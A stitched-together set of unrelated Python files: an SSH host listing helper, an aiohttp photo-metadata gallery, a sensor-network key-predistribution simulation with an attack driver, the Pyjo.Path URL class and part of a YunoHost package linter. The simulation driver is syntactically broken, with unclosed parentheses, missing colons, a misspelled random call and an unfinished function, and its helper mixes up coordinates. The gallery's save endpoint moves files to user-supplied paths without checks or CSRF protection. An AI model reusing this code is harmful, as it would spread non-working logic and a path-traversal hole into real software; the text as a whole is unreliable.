                stripped_line = line.strip(' \t\n')
                if stripped_line != '' and stripped_line[:1] != '#':
                    tokens = stripped_line.split()
                    if tokens[0].lower() == 'host' and len(tokens) > 1:
                        if host['host'] != '' and host['hostname'] != '':
                            self.hosts.append(host)
                        host = self.new_host()
                        host['host'] = tokens[1]
                    elif tokens[0].lower() == 'hostname' and len(tokens) > 1:
                        host['hostname'] = tokens[1]
                    elif tokens[0].lower() == 'port' and len(tokens) > 1:
                        host['port'] = int(tokens[1])
                    elif tokens[0].lower() == 'user' and len(tokens) > 1:
                        host['username'] = tokens[1]

            if host['host'] != '' and host['hostname'] != '':
                self.hosts.append(host)


class Ssh:
    def get_contents(self, host, path):
        parsed_path = Path(path)

        if host == "localhost":
            contents = self.local_listing(parsed_path)
        else:
            contents = self.remote_listing(host, parsed_path)

        return contents

    def local_listing(self, path):
        logging.debug('API: Getting local path %s contents' % path.as_posix())
        contents = list()

        # Work our way up the tree till we find a valid path or root
        logging.debug('Checking path %s' % path)
        if not path.exists():
            while not path.exists():
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        # localhost first
        for part in path.iterdir():
            if part.is_file():
                contents.append({
                    'name': part.name,
                    'type': 'file'
                })
            elif part.is_dir():
                contents.append({
                    'name': part.name,
                    'type': 'dir'
                })
            elif part.is_symlink():
                contents.append({
                    'name': part.name,
                    'type': 'link'
                })

        return contents

    def remote_exists(self, host, path):
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)                    
        main_output, main_error = p.communicate()

        error = main_error.decode(encoding='UTF-8')
        error_matched = re.search('No such file or directory', error)

        if error_matched is not None:
            logging.debug('Path not found')
            return False
        else:
            return True

    def remote_iterdir(self, host, path):
        # Call out to the remote host
        p = psutil.Popen(['ssh', host, 'ls', '-Fa', path.as_posix()], stdout=PIPE, stderr=PIPE)                    
        main_output, main_error = p.communicate()

        logging.debug(main_error.decode(encoding='UTF-8'))
        return main_output.decode(encoding='UTF-8').split("\n")

    def remote_listing(self, host, path):
        logging.debug('API: Getting remote host %s path %s contents' % (host, path))
        contents = list()

        logging.debug('Checking path %s' % path)
        if not self.remote_exists(host, path):
            while not self.remote_exists(host, path):
                logging.debug('Path does not exist, working up the tree...')
                logging.debug(path.as_posix())
                path = path.parent

            raise PathNotFoundException(path.as_posix())

        for line in self.remote_iterdir(host, path):
            logging.debug(line)
            if len(line) > 0 and line != './' and line != '../':
                if line[-1] == '/':
                    contents.append({
                        'type': 'dir',
                        'name': line[:-1]
                    })
                elif line[-1] == '@':
                    contents.append({
                        'type': 'link',
                        'name': line[:-1]
                    })
                elif line[-1] == '*':
                    contents.append({
                        'type': 'file',
                        'name': line[:-1]
                    })
                elif line[-1] not in ['#']:
                    contents.append({
                        'type': 'file',
                        'name': line
                    })

        return contents

import json
import logging
import os.path
import shutil
from glob import glob
from urllib.parse import quote

import aiohttp_jinja2
import jinja2
from aiohttp import web
# from PIL import Image
from pyexiv2 import ImageMetadata
from natsort import natsorted

# from gallery import settings
import settings


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
logger = logging.getLogger(__name__)


class Item():
    """
    An image in your storage.

    Called `Item` to avoid clashing with PIL's `Image`.
    """
    # IPTC values:
    #   http://www.sno.phy.queensu.ca/~phil/exiftool/TagNames/IPTC.html
    # Based on:
    #   https://www.flickr.com/groups/51035612836@N01/discuss/72057594065133113/
    # Useful tags are: Caption-Abstract, ObjectName == Headline, Keywords
    FORM = (
        'Iptc.Application2.Headline',
        'Iptc.Application2.Caption',
        # 'Iptc.Application2.Keywords',  # TODO
    )

    """A gallery item."""
    def __init__(self, path):
        self.path = path
        self.abspath = settings.STORAGE_DIR + path  # why does os.path.join not work?
        self.meta = ImageMetadata(self.abspath)
        self.meta.read()

    def __str__(self):
        return os.path.basename(self.path)

    @property
    def src(self):
        """Get the html 'src' attribute."""
        return quote(self.path)

    @property
    def backup_abspath(self):
        """
        The absolute path to where the backup for this image should go.

        In the future we may a new setting so originals aren't cluttering the
        storage directory.
        """
        return self.abspath + '.original'

    @property
    def keywords(self):
        return self.meta.get('Iptc.Application2.Keywords').value

    @property
    def headline(self):
        return self.meta.get('Iptc.Application2.Headline').value

    def get_safe_value(self, meta, key):
        """
        Get the meta value or an empty string.

        http://python3-exiv2.readthedocs.io/en/latest/api.html
        http://python3-exiv2.readthedocs.io/en/latest/tutorial.html
        """
        try:
            val = meta[key].value
            if meta[key].repeatable:
                return val

            return val[0]

        except UnicodeDecodeError:
            logger.warn('%s could not get meta for %s', self, key)
            return ''

    def get_meta_used(self):
        """List what meta tags were used in a human-readable format."""
        return self.meta.iptc_keys

    def get_all_meta(self):
        """Dict of meta tags were used in a human-readable format."""
        return {key: self.get_safe_value(self.meta, key) for key in self.meta.iptc_keys}

    def get_form_fields(self):
        ret = []
        for field in self.FORM:
            if field in self.meta.iptc_keys:
                ret.append((field, self.get_safe_value(self.meta, field)))
            else:
                ret.append((field, ''))
        return ret


@aiohttp_jinja2.template('index.html')
async def homepage(request):
    # TODO get *.jpeg too
    images = natsorted(
        glob(os.path.join(settings.STORAGE_DIR, '**/*.jpg'), recursive=True),
        key=lambda x: x.upper(),
    )
    return {'images': (Item(x.replace(settings.STORAGE_DIR, '')) for x in images)}


async def save(request):
    # TODO csrf
    data = await request.post()
    item = Item(data['src'])

    # Update name
    new_src = data.get('new_src')
    if new_src and new_src != data['src']:                    
        # don't need to worry about html unquote
        shutil.move(item.abspath, settings.STORAGE_DIR + new_src)                    
        old_backup_abspath = item.backup_abspath                    
        item = Item(new_src)                    
        if os.path.isfile(old_backup_abspath):                    
            shutil.move(old_backup_abspath, item.backup_abspath)                    

    # Update meta
    for field in item.FORM:
        # TODO handle .repeatable (keywords)
        item.meta[field] = [data.get(field, '')]

    if settings.SAVE_ORIGINALS and not os.path.isfile(item.backup_abspath):
        shutil.copyfile(item.abspath, item.backup_abspath)

    # WISHLIST don't write() if nothing changed
    item.meta.write()

    return web.Response(
        status=200,
        body=json.dumps(item.get_form_fields()).encode('utf8'),
        content_type='application/json',
    )


def check_settings(settings):
    """
    Raises exception if there's something wrong with the settings.
    """
    # TODO make sure STORAGE_DIR is writeable
    return True


def create_app(loop=None):
    if loop is None:
        app = web.Application()
    else:
        app = web.Application(loop=loop)
    app.router.add_static('/images', settings.STORAGE_DIR)
    app.router.add_static('/static', os.path.join(BASE_DIR, 'app'))
    app.router.add_route('GET', '/', homepage)
    app.router.add_route('POST', '/save/', save)
    return app


if __name__ == '__main__':
    check_settings(settings)
    app = create_app()
    aiohttp_jinja2.setup(
        app,
        loader=jinja2.FileSystemLoader(os.path.join(BASE_DIR, 'templates')),
    )
    web.run_app(app)

#!/usr/bin/python

import networkx as nx
import random

class Network:
	def __init__(self, size, width, keyPoolSize, keysPerNode, commRange):
		self.G = nx.Graph() 			# Graph of nodes
		self.size = size 				# Number of nodes in graph
		self.width = width 				# Width in meters of sides
		self.keyPoolSize = keyPoolSize 	# Number of keys in total pool
		self.keysPerNode = keysPerNode 	# Number of pools per node
		self.commRange = commRange 		# Range in meters of communication
		# Generate all nodes within the network
		self.genNodes()
		# Add edges for all nodes which are in range of each other
		self.addEdges()
		# Add calculated LKVM values
		self.calcAllLKVM()

	# Calculates all lkvm values and stores them to each node
	def calcAllLKVM(self):
		for edge in self.G.edges():
			self.calcLKVM(edge)

	# Calculates all WLPVM values based on already calculated LKVM and l
	def calcAllWLPVM(self, l):
		for edge in self.G.edges():
			self.calcWLPVM(edge, l)

	# Calculates all TPVM values based on already calculated LKVM and gamma
	def calcAllTPVM(self, gamma):
		for edge in self.G.edges():
			self.calcTPVM(edge, gamma)

	# Calculates lkvm for an edge and stores it to the edge
	def calcLKVM(self, edge):
		i = edge[0]
		j = edge[1]
		iKeys = self.G.nodes(1)[i][1]['keys']
		jKeys = self.G.nodes(1)[j][1]['keys']
		# Find shared keys along edge
		sharedKeys = iKeys.intersection(jKeys)
		# Empty set to keys acquired until same as shared keys
		c = set()
		# lkvm cost to add to
		lkvm = 0
		# Iterate while sharedKeys aren't within c
		while not sharedKeys.issubset(c):
			randNodeIndex = random.randint(0, self.size)
			c.union(self.G.nodes(1)[randNodeIndex][1]['keys'])
			lkvm = lkvm + 1
		self.G[i][j]['lkvm'] = lkvm



	# Generates the nodes within the network
	def genNodes(self):
		for i in range(self.size):                    
			self.addNewNode(i)

	# Adds a new node to the graph with random values within parameters
	def addNewNode(self, index):
		x = random.randint(0, self.width)
		y = random.randint(0, self.width)
		keys = set()
		while len(keys) < self.keysPerNode:
			keys.add(random.randint(0, self.keyPoolSize))
		self.G.add_node(index, x = x, y = y, keys = keys)
	
	# Adds edges for all nodes which are in range of each other
	def addEdges(self):
		for node in self.G.nodes(1):
			for otherNode in self.G.nodes():
				# Add edge if not the same node, if there is an edge, and if in range
				if not (node == otherNode) and not self.G.has_edge(node[0], otherNode[0]) and self.inRange(node[1], otherNode[1]):
					self.G.add_edge(node[0], otherNode[0])

	# Returns true if the nodes are in commsRange of each other
	def inRange(self, node1, node2):
		xDistance = node1['x'] - node2['x']
		yDistance = node1['y'] - node2['x']
		distance = math.sqrt(xDistance * xDistance + yDistance * yDistance)
		return distance <= self.commRange


	# Calculates 1 + l / lkvm for edge and stores it into edge attribute
	def calcWLPVM(self, edge, l):
		i = edge[0]
		j = edge[1]
		wlpvm = 1 + 1.0 * l / edge['lkvm']
		self.G[i][j]['wlpvm'] = wlpvm

	# Calculates TPVM for edge and gamma value
	def calcTPVM(self, edge, gamma):
		i = edge[0]
		j = edge[1]
		if edge['lkvm'] < gamma:
			tpvm = 1
		else:
			tpvm = float("inf")
		self.G[i][j]['tpvm'] = tpvm

#!/usr/bin/python

import networkx as nx
import random
from network import Network

# first network to test attacks on
N = Network(size=250, width=500, keyPoolSize=1000, keysPerNode=30, commRange=400)

# Try 100 values of gamma for tpvm test
gArray = range(100)                    
# Resulting array of average hops
gAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
gAvgCapArray = []
for gamma in gArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllTPVM(gamma)
	# We don't want repeated paths, so use a set
	paths = set()
	totalHops = 0;
	# Generate 30 paths
	while len(paths) < 30):
		start = random.randint(0, 250)                    
		end = randint.randint(0, 250)                    
		# add path find path if start and end are different
		if(start != end)
			shortestPath = nx.shortest_path(N.G, start, end, 'tpvm')
			# add path if not already added. If path is impossible, will cause exception
			if(shortestPath not in paths:
				paths = paths + [shortest_path]
				totalHops = totalHops + len(shortest_path)
	# Average totalHops for the gamma and add to array of averages
	gAvgHopsArray = gAvgHopsArray + [1.0 * totalHops / 30]
	# simulate attack on these paths and add average captures to array
	gAvgCapArray = gAvgCapArray + [simAttack(paths)]

# Try 100 values of l for wlpvm test
lArray = range(100)                    
# Resulting array of average hops
lAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
lAvgCapArray = []
for l in lArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllWLPVM(l)
	simAttack('wlpvm')                    

# a) find the number of keys per node
N1 = Network(size=100, width=1500, keyPoolSize=1000, keysPerNode=30, commRange=500)

# b) find number of keys per node
N2 = Network(size=1000, width=1000, keyPoolSize=1200, keysPerNode=30, commRange=100)

# Returns the number of node capt
def simAttack(paths, metric);                    

# -*- coding: utf-8 -*-

"""
Pyjo.Path - Path
================
::

    import Pyjo.Path

    # Parse
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    print(path[0])

    # Build
    path = Pyjo.Path.new(u'/i/')
    path.append('pyjo')
    print(path)

:mod:`Pyjo.Path` is a container for paths used by :mod:`Pyjo.URL` and based on
:rfc:`3986`.
"""

import Pyjo.Base
import Pyjo.Mixin.String

from Pyjo.Util import b, u, url_escape, url_unescape


class Pyjo_Path(Pyjo.Base.object, Pyjo.Mixin.String.object):
    """::

        path = Pyjo.Path.new()
        path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')

    Construct a new :mod`Pyjo.Path` object and :meth:`parse` path if necessary.
    """

    charset = 'utf-8'
    """::

        charset = path.charset
        path.charset = 'utf-8'

    Charset used for encoding and decoding, defaults to ``utf-8``. ::

        # Disable encoding and decoding
        path.charset = None
    """

    _leading_slash = False
    _path = None
    _parts = None
    _trailing_slash = False

    def __init__(self, path=None):
        super(Pyjo_Path, self).__init__()
        if path is not None:
            self.parse(path)

    def __bool__(self):
        """::

            boolean = bool(path)

        Always true. (Python 3.x)
        """
        return True

    def __bytes__(self):
        """::

            bstring = bytes(path)

        Byte-string representation of an object. (Python 3.x)
        """
        return self.to_bytes()

    def __iter__(self):
        """::

            parts = list(path)

        Iterator based on :attr:`parts`. Note that this will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons.
        """
        return iter(self.parts)

    def __nonzero__(self):
        """::

            boolean = bool(path)

        Always true. (Python 2.x)
        """
        return True

    def canonicalize(self):
        """::

            path = path.canonicalize()

        Canonicalize path. ::                    

            # "/foo/baz"
            Pyjo.Path.new('/foo/./bar/../baz').canonicalize()

            # "/../baz"
            Pyjo.Path.new('/foo/../bar/../../baz').canonicalize()
        """
        parts = self.parts
        i = 0
        while i < len(parts):
            if parts[i] == '.' or parts[i] == '':                    
                parts.pop(i)
            elif i < 1 or parts[i] != '..' or parts[i - 1] == '..':
                i += 1
            else:
                i -= 1
                parts.pop(i)
                parts.pop(i)

        if not parts:
            self.trailing_slash = False

        return self

    def clone(self):
        """::

            clone = path.clone()

        Clone path.
        """
        new_obj = type(self)()
        new_obj.charset = self.charset
        if self._parts:
            new_obj._parts = list(self._parts)
            new_obj._leading_slash = self._leading_slash
            new_obj._trailing_slash = self._trailing_slash
        else:
            new_obj._path = self._path
        return new_obj

    def contains(self, prefix):
        """::

            boolean = path.contains(u'/i//pyjo')

        Check if path contains given prefix. ::

            # True
            Pyjo.Path.new('/foo/bar').contains('/')
            Pyjo.Path.new('/foo/bar').contains('/foo')
            Pyjo.Path.new('/foo/bar').contains('/foo/bar')

            # False
            Pyjo.Path.new('/foo/bar').contains('/f')
            Pyjo.Path.new('/foo/bar').contains('/bar')
            Pyjo.Path.new('/foo/bar').contains('/whatever')
        """
        if prefix == '/':
            return True
        else:
            path = self.to_route()
            return len(path) >= len(prefix) \
                and path.startswith(prefix) \
                and (len(path) == len(prefix) or path[len(prefix)] == '/')

    @property
    def leading_slash(self):
        """::

            boolean = path.leading_slash
            path.leading_slash = boolean

        Path has a leading slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """
        return self._parse('leading_slash')

    @leading_slash.setter
    def leading_slash(self, value):
        self._parse('leading_slash', value)

    def merge(self, path):
        """::

            path = path.merge('/foo/bar')
            path = path.merge('foo/bar')
            path = path.merge(Pyjo.Path.new('foo/bar'))

        Merge paths. Note that this method will normalize both paths if necessary and
        that ``%2F`` will be treated as ``/`` for security reasons. ::

            # "/baz/yada"
            Pyjo.Path.new('/foo/bar').merge('/baz/yada')

            # "/foo/baz/yada"
            Pyjo.Path.new('/foo/bar').merge('baz/yada')

            # "/foo/bar/baz/yada"
            Pyjo.Path.new('/foo/bar/').merge('baz/yada')
        """
        # Replace
        if u(path).startswith('/'):
            return self.parse(path)

        # Merge
        if not self.trailing_slash and self.parts:
            self.parts.pop()

        path = self.new(path)
        self.parts += path.parts

        self._trailing_slash = path._trailing_slash

        return self

    def parse(self, path):
        """::

            path = path.parse('/foo%2Fbar%3B/baz.html')

        Parse path.
        """
        self._path = b(path, self.charset)

        self._parts = None
        self._leading_slash = False
        self._trailing_slash = False

        return self

    @property
    def parts(self):
        """::

            parts = path.parts
            path.parts = ['foo', 'bar', 'baz']

        The path parts. Note that this method will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons. ::

            # Part with slash
            path.parts.append('foo/bar')
        """
        return self._parse('parts')

    @parts.setter
    def parts(self, value):
        self._parse('parts', value)

    def to_abs_str(self):
        """::

            str = path.to_abs_str()

        Turn path into an absolute string. ::

            # "/i/%E2%99%A5/pyjo"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_abs_str()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_abs_str()
        """
        path = self.to_str()
        if not path.startswith('/'):
            path = '/' + path
        return path

    def to_bytes(self):
        """::

            bstring = path.to_bytes()

        Turn path into a bytes string. ::

            # b"/i/%E2%99%A5/pyjo"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_bytes()

            # b"i/%E2%99%A5/pyjo"
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_bytes()
        """
        # Path
        charset = self.charset

        if self._path is not None:
            return url_escape(self._path, br'^A-Za-z0-9\-._~!$&\'()*+,;=%:@/')

        if self._parts:
            parts = self._parts
            if charset:
                parts = map(lambda p: p.encode(charset), parts)
            path = b'/'.join(map(lambda p: url_escape(p, br'^A-Za-z0-9\-._~!$&\'()*+,;=:@'), parts))
        else:
            path = b''

        if self._leading_slash:
            path = b'/' + path

        if self._trailing_slash:
            path = path + b'/'

        return path

    def to_dir(self):
        """::

            dir = route.to_dir()

        Clone path and remove everything after the right-most slash. ::

            # "/i/%E2%99%A5/"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_dir()

            # "i/%E2%99%A5/"
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_dir()
        """
        clone = self.clone()
        if not clone.trailing_slash:
            clone.parts.pop()
        clone.trailing_slash = bool(clone.parts)
        return clone

    def to_json(self):
        """::

            string = path.to_json()

        Turn path into a JSON representation. The same as :meth:`to_str`. ::

            # "/i/%E2%99%A5/pyjo"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_json()
        """
        return self.to_str()

    def to_route(self):
        """::

            route = path.to_route()

        Turn path into a route. ::

            # "/i//pyjo"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_route()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_route()
        """
        clone = self.clone()
        if clone.charset is None:
            slash = b'/'
        else:
            slash = '/'
        route = slash + slash.join(clone.parts)
        if clone._trailing_slash:
            route += slash
        return route

    def to_str(self):
        """::

            string = path.to_str()

        Turn path into a string. ::

            # "/i/%E2%99%A5/pyjo"
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_str()

            # "i/%E2%99%A5/pyjo"
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_str()
        """
        return self.to_bytes().decode('ascii')

    @property
    def trailing_slash(self):
        """::

            boolean = path.trailing_slash
            path.trailing_slash = boolean

        Path has a trailing slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """
        return self._parse('trailing_slash')

    @trailing_slash.setter
    def trailing_slash(self, value):
        self._parse('trailing_slash', value)

    def _parse(self, name, *args):
        if self._parts is None:
            charset = self.charset

            if self._path is not None:
                path = self._path
            else:
                path = u'' if charset else b''

            if charset:
                path = url_unescape(b(path, charset)).decode(charset)
                slash = u'/'
            else:
                path = url_unescape(path)
                slash = b'/'

            self._path = None

            if path.startswith(slash):
                path = path[1:]
                self._leading_slash = True

            if path.endswith(slash):
                path = path[:-1]
                self._trailing_slash = True

            if path == '':
                self._parts = []
            else:
                self._parts = path.split(slash)

        if not args:
            return getattr(self, '_' + name)

        setattr(self, '_' + name, args[0])


new = Pyjo_Path.new
object = Pyjo_Path  # @ReservedAssignment

#!/usr/bin/env python3
# -*- coding: utf8 -*-

import sys
import os
import re
import json
import shlex
import urllib.request
import codecs

reader = codecs.getreader("utf-8")
return_code = 0


# ############################################################################
#   Utilities
# ############################################################################


class c:
    HEADER = '\033[94m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    MAYBE_FAIL = '\033[96m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def header(app):
    print("""
    [{header}{bold}YunoHost App Package Linter{end}]

 App packaging documentation - https://yunohost.org/#/packaging_apps
 App package example         - https://github.com/YunoHost/example_ynh
 Official helpers            - https://yunohost.org/#/packaging_apps_helpers_en
 Experimental helpers        - https://github.com/YunoHost-Apps/Experimental_helpers

    Analyzing package {header}{app}{end}"""
    .format(header=c.HEADER, bold=c.BOLD, end=c.END, app=app))


def print_header(str):
    print("\n [" + c.BOLD + c.HEADER + str.title() + c.END + "]\n")


def print_right(str):
    print(c.OKGREEN + "", str, c.END)


def print_warning(str):
    print(c.WARNING + "!", str, c.END)


def print_error(str, reliable=True):
    if reliable:
        global return_code
        return_code = 1
        print(c.FAIL + "", str, c.END)
    else:
        print(c.MAYBE_FAIL + "?", str, c.END)


def urlopen(url):
    try:
        conn = urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        return {'content': '', 'code': e.code}
    except urllib.error.URLError as e:
        print('URLError')
    return {'content': conn.read().decode('UTF8'), 'code': 200}


def file_exists(file_path):
    return os.path.isfile(file_path) and os.stat(file_path).st_size > 0


# ############################################################################
#   Actual high-level checks
# ############################################################################

class App():

    def __init__(self, path):

        print_header("LOADING APP")
        self.path = path

        scripts = ["install", "remove", "upgrade", "backup", "restore"]
        self.scripts = {f: Script(self.path, f) for f in scripts}

    def analyze(self):

        self.misc_file_checks()
        self.check_helper_consistency()
        self.check_source_management()
        self.check_manifest()

        for script in self.scripts.values():
            if script.exists:
                script.analyze()

    def misc_file_checks(self):

        print_header("MISC FILE CHECKS")

        #
        # Check for recommended and mandatory files
        #

        filenames = ("manifest.json", "LICENSE", "README.md",
                     "scripts/install", "scripts/remove",
                     "scripts/upgrade",
                     "scripts/backup", "scripts/restore")
        non_mandatory = ("script/backup", "script/restore")

        for filename in filenames:
            if file_exists(self.path + "/" + filename):
                continue
            elif filename in non_mandatory:
                print_warning("Consider adding a file %s" % filename)
            else:
                print_error("File %s is mandatory" % filename)

        #
        # Deprecated php-fpm.ini thing
        #

        if file_exists(self.path + "/conf/php-fpm.ini"):
            print_warning(
                "Using a separate php-fpm.ini file is deprecated. "
                "Please merge your php-fpm directives directly in the pool file. "
                "(c.f. https://github.com/YunoHost-Apps/nextcloud_ynh/issues/138 )"
            )

        #
        # Deprecated usage of 'add_header' in nginx conf
        #

        for filename in os.listdir(self.path + "/conf"):
            if not os.path.isfile(self.path + "/conf/" + filename):                    
                continue
            content = open(self.path + "/conf/" + filename).read()
            if "location" in content and "add_header" in content:
                print_warning(
                    "Do not use 'add_header' in the nginx conf. Use 'more_set_headers' instead. "
                    "(See https://www.peterbe.com/plog/be-very-careful-with-your-add_header-in-nginx "
                    "and https://github.com/openresty/headers-more-nginx-module#more_set_headers )"
                )

    def check_helper_consistency(self):
        """
        check if ynh_install_app_dependencies is present in install/upgrade/restore
        so dependencies are up to date after restoration or upgrade
        """

        install_script = self.scripts["install"]
        if install_script.exists:
            if install_script.contains("ynh_install_app_dependencies"):
                for name in ["upgrade", "restore"]:
                    if self.scripts[name].exists and not self.scripts[name].contains("ynh_install_app_dependencies"):
                        print_warning("ynh_install_app_dependencies should also be in %s script" % name)

            if install_script.contains("yunohost service add"):
                if self.scripts["remove"].exists and not self.scripts["remove"].contains("yunohost service remove"):
                    print_error(
                        "You used 'yunohost service add' in the install script, "
                        "but not 'yunohost service remove' in the remove script."
                    )

    def check_source_management(self):
        print_header("SOURCES MANAGEMENT")
        DIR = os.path.join(self.path, "sources")
        # Check if there is more than six files on 'sources' folder
        if os.path.exists(os.path.join(self.path, "sources")) \
           and len([name for name in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, name))]) > 5:
            print_warning(
                "[YEP-3.3] Upstream app sources shouldn't be stored in this 'sources' folder of this git repository as a copy/paste\n"
                "During installation, the package should download sources from upstream via 'ynh_setup_source'.\n"
                "See the helper documentation. "
                "Original discussion happened here : "
                "https://github.com/YunoHost/issues/issues/201#issuecomment-391549262"
            )

    def check_manifest(self):
        manifest = os.path.join(self.path, 'manifest.json')
        if not os.path.exists(manifest):
            return
        print_header("MANIFEST")
        """
        Check if there is no comma syntax issue
        """

        try:
            with open(manifest, encoding='utf-8') as data_file:
                manifest = json.loads(data_file.read())
        except:
            print_error("[YEP-2.1] Syntax (comma) or encoding issue with manifest.json. Can't check file.")

        fields = ("name", "id", "packaging_format", "description", "url", "version",
                  "license", "maintainer", "requirements", "multi_instance",
                  "services", "arguments")

        for field in fields:
            if field not in manifest:
                print_warning("[YEP-2.1] \"" + field + "\" field is missing")

        """
        Check values in keys
        """

        if "packaging_format" not in manifest:
            print_error("[YEP-2.1] \"packaging_format\" key is missing")
        elif not isinstance(manifest["packaging_format"], int):
            print_error("[YEP-2.1] \"packaging_format\": value isn't an integer type")
        elif manifest["packaging_format"] != 1:
            print_error("[YEP-2.1] \"packaging_format\" field: current format value is '1'")

        # YEP 1.1 Name is app
        if "id" in manifest:
            if not re.match('^[a-z1-9]((_|-)?[a-z1-9])+$', manifest["id"]):
                print_error("[YEP-1.1] 'id' field '%s' should respect this regex '^[a-z1-9]((_|-)?[a-z1-9])+$'")

        if "name" in manifest:
            if len(manifest["name"]) > 22:
                print_warning(
                    "[YEP-1.1] The 'name' field shouldn't be too long to be able to be with one line in the app list. "
                    "The most current bigger name is actually compound of 22 characters."
                )

        # YEP 1.2 Put the app in a weel known repo
        if "id" in manifest:
            official_list_url = "https://raw.githubusercontent.com/YunoHost/apps/master/official.json"
            official_list = json.loads(urlopen(official_list_url)['content'])
            community_list_url = "https://raw.githubusercontent.com/YunoHost/apps/master/community.json"
            community_list = json.loads(urlopen(community_list_url)['content'])
            if manifest["id"] not in official_list and manifest["id"] not in community_list:
                print_warning("[YEP-1.2] This app is not registered in official or community applications")

        # YEP 1.3 License
        def license_mentionned_in_readme(path):
            readme_path = os.path.join(path, 'README.md')
            if os.path.isfile(readme_path):
                return "LICENSE" in open(readme_path).read()
            return False

        if "license" in manifest:
            for license in manifest['license'].replace('&', ',').split(','):
                code_license = '<code property="spdx:licenseId">' + license + '</code>'
                link = "https://spdx.org/licenses/"
                if license == "nonfree":
                    print_warning("[YEP-1.3] The correct value for non free license in license field is 'non-free' and not 'nonfree'")
                    license = "non-free"
                if license in ["free", "non-free", "dep-non-free"]:
                    if not license_mentionned_in_readme(self.path):
                        print_warning(
                            "[YEP-1.3] The use of '%s' in license field implies "
                            " to write something about the license in your README.md" % (license)
                        )
                    if license in ["non-free", "dep-non-free"]:
                        print_warning(
                            "[YEP-1.3] 'non-free' apps can't be officialized. "
                            " Their integration is still being discussed, especially for apps with non-free dependencies"
                        )
                elif code_license not in urlopen(link)['content']:
                    print_warning(
                        "[YEP-1.3] The license '%s' is not registered in https://spdx.org/licenses/ . "
                        "It can be a typo error. If not, you should replace it by 'free' "
                        "or 'non-free' and give some explanations in the README.md." % (license)
                    )

        # YEP 1.4 Inform if we continue to maintain the app
        # YEP 1.5 Update regularly the app status
        # YEP 1.6 Check regularly the evolution of the upstream

        # YEP 1.7 - Add an app to the YunoHost-Apps organization
        if "id" in manifest:
            repo = "https://github.com/YunoHost-Apps/%s_ynh" % (manifest["id"])
            is_not_added_to_org =  urlopen(repo)['code'] == 404

            if is_not_added_to_org:
                print_warning("[YEP-1.7] You should add your app in the YunoHost-Apps organisation.")

        # YEP 1.8 Publish test request
        # YEP 1.9 Document app
        if "description" in manifest:
            descr = manifest["description"]
            if isinstance(descr, dict):
                descr = descr.get("en", None)

            if descr is None or descr == manifest.get("name", None):
                print_warning(
                    "[YEP-1.9] You should write a good description of the app, "
                    "at least in english (1 line is enough)."
                )

            elif "for yunohost" in descr.lower():
                print_warning(
                    "[YEP-1.9] The 'description' should explain what the app actually does. "
                    "No need to say that it is 'for YunoHost' - this is a YunoHost app "
                    "so of course we know it is for YunoHost ;-)."
                )

        # TODO test a specific template in README.md

        # YEP 1.10 Garder un historique de version propre

        # YEP 1.11 Cancelled

        # YEP 2.1
        if "multi_instance" in manifest and manifest["multi_instance"] != 1 and manifest["multi_instance"] != 0:
            print_error(
                "[YEP-2.1] \"multi_instance\" field must be boolean type values 'true' or 'false' and not string type")

        if "services" in manifest:
            services = ("nginx", "mysql", "uwsgi", "metronome",
                        "php5-fpm", "php7.0-fpm", "php-fpm",
                        "postfix", "dovecot", "rspamd")

            for service in manifest["services"]:
                if service not in services:
                    # FIXME : wtf is it supposed to mean ...
                    print_warning("[YEP-2.1] " + service + " service may not exist")

        if "install" in manifest["arguments"]:

            recognized_types = ("domain", "path", "boolean", "app", "password", "user", "string")

            for argument in manifest["arguments"]["install"]:
                if "type" not in argument.keys():
                    print_warning(
                        "[YEP-2.1] You should specify the type of the argument '%s'. "
                        "You can use : %s." % (argument["name"], ', '.join(recognized_types))
                    )
                elif argument["type"] not in recognized_types:
                    print_warning(
                        "[YEP-2.1] The type '%s' for argument '%s' is not recognized... "
                        "it probably doesn't behave as you expect ? Choose among those instead : %s" % (argument["type"], argument["name"], ', '.join(recognized_types))
                    )

                if "choices" in argument.keys():
                    choices = [c.lower() for c in argument["choices"]]
                    if len(choices) == 2:
                        if ("true" in choices and "false" in choices) or ("yes" in choices and "no" in choices):
                            print_warning(
                                "Argument %s : you might want to simply use a boolean-type argument. "
                                "No need to specify the choices list yourself." % argument["name"]
                            )

        if "url" in manifest and manifest["url"].endswith("_ynh"):
            print_warning(
                "'url' is not meant to be the url of the yunohost package, "
                "but rather the website or repo of the upstream app itself..."
            )


class Script():

    def __init__(self, app_path, name):
        self.name = name
        self.path = app_path + "/scripts/" + name
        self.exists = file_exists(self.path)
        if not self.exists:
            return
        self.lines = list(self.read_file())

    def read_file(self):
        with open(self.path) as f:
            lines = f.readlines()

        # Remove trailing spaces, empty lines and comment lines
        lines = [line.strip() for line in lines]
        lines = [line for line in lines if line and not line.startswith('#')]

        # Merge lines when ending with \
